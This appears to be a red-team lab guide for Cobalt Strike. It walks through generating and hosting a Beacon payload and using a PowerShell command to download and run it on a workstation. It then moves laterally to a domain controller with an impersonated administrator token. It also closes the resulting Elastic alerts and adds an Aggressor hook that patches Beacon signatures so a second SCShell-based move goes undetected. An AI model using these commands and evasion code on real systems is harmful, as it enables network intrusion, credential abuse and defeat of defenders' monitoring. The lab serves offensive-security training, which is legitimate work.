# Generate and host payload

1. [ ] Launch Cobalt Strike and connect to the Team Server.
2. [ ] Generate a payload.
    1. **Payloads > Windows Stageless Payload**
    2. Listener: http
    3. Click **Generate**
    4. Save to *C:\Payloads\beacon_x64.exe*
3. [ ] Host the payload.
    1. **Site Management > Host File**
    2. File: +++C:\Payloads\beacon_x64.exe+++
    3. Local URI: +++/beacon_x64.exe+++
    4. Click **Launch**
4. [ ] Switch to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with +++@lab.VirtualMachine(lon-wkstn-1).Password+++.
5. [ ] Download and execute the payload.
 
	```powershell
    iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64.exe"
    Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64.exe"
    ```

6. [ ] Switch back to the @lab.VirtualMachine(attacker-desktop).SelectLink.

===

# Move laterally (attempt #1)

1. [ ] Interact with the new Beacon.
2. [ ] Impersonate the default domain administrator and move laterally to the DC using PsExec:
    1. +++make_token CONTOSO\Administrator Passw0rd!+++
    2. +++jump psexec64 lon-dc-1 smb+++

3. [ ] Switch back to @lab.VirtualMachine(lon-wkstn-1).SelectLink and review any alerts in Elastic.
    1. +++https://10.10.120.200:5601+++
    2. Username & password is +++elastic+++.
    
    > [!help] You should see alerts including:
    >
    > 1. NewCredential Logon by a Suspicious Process
    > 2. Suspicious Service ImagePath Value

4. [ ] Mark the alerts as closed.
5. [ ] Switch back to the @lab.VirtualMachine(attacker-desktop).SelectLink.
6. [ ] Exit the Beacon running on *lon-dc-1*.

===

# Move laterally (attempt #2)

1. [ ] Launch VSCode and open *C:\Tools\Crystal-Kit\crystalkit.cna*.
2. [ ] Add the **BEACON_RDLL_GENERATE_LOCAL** hook:

	```Aggressor-nocolor
    set BEACON_RDLL_GENERATE_LOCAL
    {
        local ( '$beacon $arch $spec_path $spec $final' );
        
        $beacon = $2;
        $arch   = $3;
    
        if ( $arch eq "x86" )
        {
            warn ( "Crystal Kit is x64 only" );
            return $null;
        }
    
        print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
    
        $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
        $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
        $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
        $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
    
        # get path to spec file
        $spec_path = getFileProper ( script_resource ( "udrl" ), "loader.spec" );
    
        # parse the spec
        $spec = [ LinkSpec Parse: $spec_path ];
    
        # apply the spec
        $final = [ $spec run: $beacon, [ new HashMap ] ];
    
        if ( strlen ( $final ) == 0 )
        {
            warn ( "Failed to build payload" );
            return $null;
        }
    
        return $final;
	}
    ```

3. [ ] Save the changes.
4. [ ] Reload the CNA in Cobalt Strike.
5. [ ] From your foothold Beacon, spawn a new Beacon in *runas.exe*.
    1. +++spawnto x64 %windir%\sysnative\runas.exe+++
    2. +++spawn tcp-local+++

6. [ ] Interact with this new Beacon.
7. [ ] Impersonate the default domain administrator and move laterally to the DC using SCShell:
    1. +++make_token CONTOSO\Administrator Passw0rd!+++
    2. +++jump scshell64 lon-dc-1 smb+++
8. [ ] Switch back to @lab.VirtualMachine(lon-wkstn-1).SelectLink and review any alerts in Elastic.

	> [!hint] You should not see the same alerts as with the previous attempt.

<br />

> [!knowledge] In this lab, you have impersonated a user with make_token and moved laterally without being detected by Elastic.